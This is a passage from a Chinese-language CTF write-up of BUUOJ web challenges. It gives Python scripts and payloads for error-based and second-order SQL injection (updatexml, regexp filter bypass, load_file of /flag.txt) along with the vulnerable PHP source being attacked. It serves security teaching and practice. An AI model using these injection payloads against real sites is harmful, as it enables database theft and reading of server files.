    _ = session.post(url,data=data)

def login(sql):
    url = 'http://f3418ca6-ca1d-4c29-9a4b-f268e01a9fea.node4.buuoj.cn:81/login.php'
    data = {
    'username': sql,
    'password': '1'
    }
    _ = session.post(url,data=data)
def changepwd():
    url = 'http://f3418ca6-ca1d-4c29-9a4b-f268e01a9fea.node4.buuoj.cn:81/changepwd.php'
    data = {
    'oldpass': '1',
    'newpass': '1'
    }
    res = session.post(url,data=data)
    print(res.text.replace('<form action="" method="post"><p>oldpass: <input type="text" name="oldpass" /></p><p>newpass: <input type="text" name="newpass" /></p><input type="submit" value="Submit" /></form>',''))

sql = '''1"&&updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('flag')),0x7e),1)#'''
#sql = '''1"&&updatexml(1,concat(0x7e,(select(replace((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('flag')),'flag{fc0fbd0f-1d9b-48ef-9fbb-5d',''))),0x7e),1)#'''
register(sql)
login(sql)
changepwd()
```

这里说一下 payload

```
1"&&updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('flag')),0x7e),1)#
```

直接查询 `real_flag_1s_here` 的内容会返回一堆无关数据, 而且 like rlike 这些会被过滤, 但好在 regexp 没有被过滤

然后写的时候注意括号不要闭合错了

最后运行脚本得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161157540.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161157906.png)

## [CISCN2019 华北赛区 Day1 Web5]CyberPunk

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171146956.png)

右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171146133.png)

猜测是文件包含

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171147361.png)

把 php 都下载下来

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171147634.png)

index.php

```php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

设置了 open_basedir, 只有 include 可控的话无法绕过...

网站本身有很多订单操作的逻辑, 猜测可能是通过注入的方式得到 flag

confirm.php

```python
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>
```

pattern 几乎把能过滤的都给过滤的, 试了下堆叠注入发现执行失败

这里 user_name phone 怎么传都显示不了 `no sql inject!`, 只有 `未找到订单`

但这个查询的地方确实也是有 sql 注入的...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171201359.png)

然后看到 change.php 里有一处直接拼接的 sql 语句

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

更新订单信息的那条 update 语句, 直接把上次查询的 `$row['address']` 给拼接到语句里面

新的 `$address` 虽然也是拼接, 但是有 addslashes 包着

回到 confirm.php 里看发现传入的 `$_POST['address']` 没有任何顾虑

所以这题思路应该就是二次注入, 注入点就是 address

跟上一题类似, 直接写脚本

```python
import requests
import random

rand_list = list()

def confirm(sql):
    rand = str(random.random())
    rand_list.append(rand)
    data = {
    'user_name': rand,
    'phone': rand,
    'address': sql
    }
    requests.post('http://1768f18c-e009-4c7d-b565-c432aa2d7d3a.node4.buuoj.cn:81/confirm.php',data=data)

def change():
    rand = rand_list.pop()
    data = {
    'user_name': rand,
    'phone': rand,
    'address': '123'
    }
    res = requests.post('http://1768f18c-e009-4c7d-b565-c432aa2d7d3a.node4.buuoj.cn:81/change.php',data=data)
    print(res.text)

payload = 'select replace((select load_file("/flag.txt")),"","")'

sql = "' and updatexml(1,concat(0x7e,(" + payload + "),0x7e),1) #"

confirm(sql)
change()
```

update 这里确实能报错, 但是 updatexml 后面需要加注释

root 权限直接读 flag.txt, 绕过长度限制的思路跟上一题一样都是用 replace

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171206923.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209171206477.png)

## [WUSTCTF2020]CV Maker

